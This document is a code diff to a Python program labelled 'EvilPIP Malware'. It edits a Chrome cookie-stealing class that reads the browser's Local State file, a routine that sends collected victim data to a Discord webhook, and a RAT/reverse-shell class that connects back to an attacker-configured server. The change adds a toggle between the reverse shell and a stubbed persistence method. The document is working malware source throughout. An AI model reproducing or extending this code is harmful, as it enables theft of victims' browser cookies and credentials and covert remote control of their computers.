@@ -23,9 +23,10 @@ from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
 
 class VARIABLES:
     webhook   = "" # your discord webhook
+    REVSHELL  = True # true = try to connect to reverse shell, false = dont
     serverip  = "192.168.1.1" # your server/host ip
-    port      = 80 # port to connect to
-    buffer    = 1024 # buffer size to send (in bytes)
+    buffer    = 1024 # buffer (in bytes) to send each message
+    port      = 80 # port for victim to connect to
 
 class EVIL:
     """ EvilPIP Malware """
@@ -194,7 +195,7 @@ class EVIL:
 
 
         class GetChromeCookies:
-            """ Current error: can't decrypt cookies """
+            """ Get Chrome Cookies - Current error: can't decrypt cookies """
             def __init__(self):
                 local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
                 with open(local_state_path, "r", encoding="utf-8") as f: local_state = json.loads(f.read())
@@ -380,17 +381,20 @@ class EVIL:
                 "embeds": [embed],
                 "username": "EvilPIP"
             }
-
             req = post(VARIABLES.webhook, headers={"content-type": "application/json"}, data=json.dumps(heading).encode())
 
             NETWORK = PROGRAM.NETWORK()
-            NETWORK.Main()
+            NETWORK.Main() if VARIABLES.REVSHELL else NETWORK.Persistence()
+
 
     class NETWORK:
-        """ RAT/Reverse shell - ! still in development stage !"""
+        """ RAT/Reverse Shell - Isn't very good ATM"""
         def __init__(self):
             self.ip = get("https://icanhazip.com").text.split("\n")[0]
             self.cwd = os.getcwd()
+
+        def Persistence(self):
+            return None
 
         def onLoad(self):
             embed = {
